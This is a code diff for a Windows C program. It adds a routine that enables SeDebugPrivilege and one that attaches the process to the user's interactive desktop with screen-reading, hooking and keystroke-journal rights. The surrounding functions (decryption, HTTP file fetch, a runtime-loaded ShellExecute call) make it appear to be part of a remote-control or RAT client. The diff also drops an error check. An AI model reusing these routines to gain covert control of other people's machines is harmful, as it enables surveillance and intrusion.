@@ -30,29 +30,20 @@ void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)
 	}
 }
 
-BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
+BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege)
 {
-	HANDLE hToken=NULL;
+	HANDLE hToken = NULL;
 	TOKEN_PRIVILEGES tp;
-	LUID luid;
 	
-	if(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken)==0)
+	if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) == 0)
 	{
 		return FALSE;
 	}
 	
-	if ( !LookupPrivilegeValue(NULL,lpszPrivilege,&luid)) 
-	{
-		CloseHandle( hToken );
-		return FALSE; 
-	}
+	LookupPrivilegeValue(NULL,lpszPrivilege,&tp.Privileges[0].Luid);
 	
 	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	if (bEnablePrivilege)
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	else
-		tp.Privileges[0].Attributes = 0;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 	
 	if ( !AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) )
 	{ 
@@ -60,6 +51,11 @@ BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
 		return FALSE; 
 	} 
 	return TRUE;
+}
+
+int GrantPrivilege()
+{
+	return SetPrivilege(SE_DEBUG_NAME);
 }
 
 char* GetHttpFile(char Url[])
@@ -150,4 +146,53 @@ void OpenUrl(char url[])
 
 	SHELLRUN(GetDesktopWindow(),"open",url,NULL,NULL,5); 
     FreeLibrary(hshell);
+}
+
+BOOL OpenUserDesktop()
+{
+	HDESK   hdeskCurrent;
+	HDESK   hdesk;
+	HWINSTA hwinstaCurrent;
+	HWINSTA hwinsta;
+	
+	hwinstaCurrent = GetProcessWindowStation();
+    if (hwinstaCurrent == NULL)
+		return FALSE;
+	
+    hdeskCurrent = GetThreadDesktop(GetCurrentThreadId());
+	if (hdeskCurrent == NULL)
+		return FALSE;
+	
+    hwinsta = OpenWindowStation(_T("winsta0"), FALSE,
+		WINSTA_ACCESSCLIPBOARD   |
+		WINSTA_ACCESSGLOBALATOMS |
+		WINSTA_CREATEDESKTOP     |
+		WINSTA_ENUMDESKTOPS      |
+		WINSTA_ENUMERATE         |
+		WINSTA_EXITWINDOWS       |
+		WINSTA_READATTRIBUTES    |
+		WINSTA_READSCREEN        |
+		WINSTA_WRITEATTRIBUTES);
+    if (hwinsta == NULL)
+		return FALSE;
+	
+    if (!SetProcessWindowStation(hwinsta))
+		return FALSE;
+	
+    hdesk = OpenDesktop(_T("default"), 0, FALSE,
+		DESKTOP_CREATEMENU      |
+		DESKTOP_CREATEWINDOW    |
+		DESKTOP_ENUMERATE       |
+		DESKTOP_HOOKCONTROL     |
+		DESKTOP_JOURNALPLAYBACK |
+		DESKTOP_JOURNALRECORD   |
+		DESKTOP_READOBJECTS     |
+		DESKTOP_SWITCHDESKTOP   |
+		DESKTOP_WRITEOBJECTS);
+	if (hdesk == NULL)
+		return FALSE;
+	
+	SetThreadDesktop(hdesk);
+	
+	return TRUE;
 }
